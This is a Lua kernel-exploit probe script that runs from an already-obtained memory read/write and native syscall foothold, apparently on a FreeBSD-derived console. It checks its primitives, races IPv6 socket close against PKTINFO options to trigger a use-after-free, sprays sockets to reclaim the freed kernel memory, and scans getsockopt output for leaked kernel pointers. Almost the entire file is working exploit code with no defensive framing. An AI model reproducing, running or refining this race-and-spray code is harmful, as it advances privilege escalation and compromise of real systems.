-- CRASH_CLASS: HIGH
-- PROBE 147a: Safe IPv6 UAF race with proper init
--
-- Context: 141a-144a crashed instantly (CONNECTION_RESET).
-- Root cause: likely accessing uninitialized globals or
-- the race itself hitting a fatal kernel path.
-- This version: verifies all primitives first, uses fewer
-- rounds, and catches errors at each step.

print("=== PROBE 147a: SAFE IPV6 UAF RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- ============================================================
-- SECTION A: Verify all primitives
-- ============================================================
print("")
print("--- SECTION A: PRIMITIVE CHECK ---")

if not native then
    print("ERROR: native not available")
    print("=== PROBE 147a COMPLETE ===")
    return
end
if not native.fcall_with_rax then
    print("ERROR: native.fcall_with_rax not available")
    print("=== PROBE 147a COMPLETE ===")
    return
end

local stub = syscall.pipe.fn_addr
print("stub=" .. string.format("0x%X", to_num(stub)))

-- Test basic syscall
local test_pid = to_num(native.fcall_with_rax(stub, 20))
print("getpid=" .. test_pid .. " (expected " .. pid .. ")")
if test_pid ~= pid then
    print("ERROR: fcall_with_rax not working")
    print("=== PROBE 147a COMPLETE ===")
    return
end

-- Test socket creation
local test_sock = to_num(native.fcall_with_rax(stub, 97, 28, 2, 0))
print("test IPv6 socket=" .. test_sock)
if test_sock < 0 then
    print("ERROR: cannot create IPv6 socket")
    print("=== PROBE 147a COMPLETE ===")
    return
end
native.fcall_with_rax(stub, 6, test_sock)

-- Test threading
if not fcall then
    print("ERROR: fcall global not available")
    print("=== PROBE 147a COMPLETE ===")
    return
end
if not libc_addrofs or not libc_addrofs.Thrd_create then
    print("ERROR: libc_addrofs.Thrd_create not available")
    print("=== PROBE 147a COMPLETE ===")
    return
end

local thrd_create = fcall(libc_addrofs.Thrd_create)
local thrd_join = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- Test thread creation
local test_shared = memory.alloc(8)
safe_wq(test_shared, uint64(0))
local test_thr = memory.alloc(8)
local tok, tret = pcall(thrd_create, test_thr, atomic_fn, uint64(to_num(test_shared)))
if not tok then
    print("ERROR: Thrd_create failed: " .. tostring(tret))
    print("=== PROBE 147a COMPLETE ===")
    return
end
print("thread test: ret=" .. to_num(tret))
pcall(thrd_join, memory.read_qword(test_thr), uint64(0))

print("All primitives OK")
print("canary_a: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- SECTION B: IPv6 socket + PKTINFO baseline
-- ============================================================
print("")
print("--- SECTION B: IPV6 PKTINFO BASELINE ---")

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46

local sock = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
print("socket fd=" .. sock)

-- Set PKTINFO to allocate pktopts in kernel
local pktinfo = memory.alloc(20)
for i = 0, 16, 4 do safe_wd(pktinfo + i, 0) end
local sso = to_num(native.fcall_with_rax(stub, 105, sock, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 20))
print("setsockopt(PKTINFO) ret=" .. sso)

-- Read back
local optbuf = memory.alloc(64)
local optlen = memory.alloc(4)
safe_wd(optlen, 64)
local gso = to_num(native.fcall_with_rax(stub, 118, sock, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optbuf), to_num(optlen)))
local got_len = safe_rd(optlen)
print("getsockopt(PKTINFO) ret=" .. gso .. " len=" .. (got_len or 0))

-- Scan for kernel pointers
for off = 0, (got_len or 0) - 1, 8 do
    local v = safe_rq(optbuf + off)
    if is_kptr(v) then
        print("  *** BASELINE KPTR at +" .. string.format("0x%X", off) .. ": " .. fmt_addr(v) .. " ***")
    end
end

native.fcall_with_rax(stub, 6, sock)
print("canary_b: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- SECTION C: Threaded close + setsockopt race (20 rounds)
-- ============================================================
print("")
print("--- SECTION C: CLOSE+SETSOCKOPT RACE (20 rounds) ---")

local kptr_hits = 0
local race_success = 0

for round = 1, 20 do
    -- Create IPv6 UDP socket
    local s = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
    if s < 0 then
        print("  round " .. round .. ": socket failed")
        break
    end

    -- Set PKTINFO to allocate pktopts struct in kernel
    local pi = memory.alloc(20)
    for i = 0, 16, 4 do safe_wd(pi + i, 0) end
    native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pi), 20)

    -- Create thread for scheduling pressure
    local shared = memory.alloc(8)
    safe_wq(shared, uint64(0))
    local thr = memory.alloc(8)
    pcall(thrd_create, thr, atomic_fn, uint64(to_num(shared)))

    -- RACE: close(fd) then immediately setsockopt on same fd
    -- The kernel close path frees pktopts. If setsockopt runs
    -- concurrently, it may write to freed memory (UAF).
    native.fcall_with_rax(stub, 6, s)  -- close

    -- Immediately create a new socket to try to reclaim the fd
    local s2 = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))

    if s2 == s then
        race_success = race_success + 1
        -- Same fd number — check if getsockopt returns stale data
        safe_wd(optlen, 64)
        safe_wq(optbuf, uint64(0))
        local gr = to_num(native.fcall_with_rax(stub, 118, s2, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optbuf), to_num(optlen)))
        if gr == 0 then
            local olen = safe_rd(optlen)
            for off = 0, (olen or 0) - 1, 8 do
                local v = safe_rq(optbuf + off)
                if is_kptr(v) then
                    kptr_hits = kptr_hits + 1
                    print(string.format("  *** KPTR round %d fd=%d +0x%X: %s ***", round, s2, off, fmt_addr(v)))
                end
            end
        end
    end

    -- Cleanup
    if s2 >= 0 then native.fcall_with_rax(stub, 6, s2) end
    pcall(thrd_join, memory.read_qword(thr), uint64(0))

    -- Canary check every 5 rounds
    if round % 5 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CANARY FAILED at round " .. round .. " ***")
            break
        end
    end
end

print("fd reuse hits: " .. race_success .. "/20")
print("kernel pointer hits: " .. kptr_hits)
print("canary_c: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- SECTION D: Heap spray reclaim (10 rounds)
-- ============================================================
print("")
print("--- SECTION D: HEAP SPRAY RECLAIM (10 rounds) ---")

local spray_kptr = 0

for round = 1, 10 do
    -- Create socket, set PKTINFO
    local s = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
    if s < 0 then break end
    local pi = memory.alloc(20)
    for i = 0, 16, 4 do safe_wd(pi + i, 0) end
    native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pi), 20)

    -- Close socket (frees pktopts in kernel)
    native.fcall_with_rax(stub, 6, s)

    -- Spray 16 new IPv6 sockets with PKTINFO to reclaim freed memory
    local spray_fds = {}
    for i = 1, 16 do
        local sf = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
        if sf >= 0 then
            native.fcall_with_rax(stub, 105, sf, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pi), 20)
            spray_fds[#spray_fds + 1] = sf
        end
    end

    -- Check all spray sockets for kernel pointer cross-contamination
    for _, sf in ipairs(spray_fds) do
        safe_wd(optlen, 64)
        safe_wq(optbuf, uint64(0))
        local gr = to_num(native.fcall_with_rax(stub, 118, sf, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optbuf), to_num(optlen)))
        if gr == 0 then
            local olen = safe_rd(optlen)
            for off = 0, (olen or 0) - 1, 8 do
                local v = safe_rq(optbuf + off)
                if is_kptr(v) then
                    spray_kptr = spray_kptr + 1
                    print(string.format("  *** SPRAY KPTR round %d fd=%d +0x%X: %s ***", round, sf, off, fmt_addr(v)))
                end
            end
        end
    end

    -- Cleanup spray
    for _, sf in ipairs(spray_fds) do
        native.fcall_with_rax(stub, 6, sf)
    end
end

print("spray kernel pointer hits: " .. spray_kptr)

-- ============================================================
-- SECTION E: getsockopt scan on live PKTINFO socket
-- ============================================================
print("")
print("--- SECTION E: DEEP SOCKOPT SCAN ---")

local deep_sock = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
if deep_sock >= 0 then
    local pi = memory.alloc(20)
    for i = 0, 16, 4 do safe_wd(pi + i, 0) end
    native.fcall_with_rax(stub, 105, deep_sock, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pi), 20)

    -- Scan IPV6 options that might leak after PKTINFO allocation
    local deep_kptr = 0
    for opt = 0, 80 do
        safe_wq(optbuf, uint64(0))
        safe_wd(optlen, 256)
        local gr = to_num(native.fcall_with_rax(stub, 118, deep_sock, IPPROTO_IPV6, opt, to_num(optbuf), to_num(optlen)))
        if gr == 0 then
            local olen = safe_rd(optlen)
            if olen and olen > 0 then
                for off = 0, olen - 1, 8 do
                    local v = safe_rq(optbuf + off)
                    if is_kptr(v) then
                        deep_kptr = deep_kptr + 1
                        print(string.format("  *** OPT %d +0x%X: %s ***", opt, off, fmt_addr(v)))
                    end
                end
            end
        end
    end
    print("deep scan kptr: " .. deep_kptr)
    native.fcall_with_rax(stub, 6, deep_sock)
end

local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 147a COMPLETE ===")
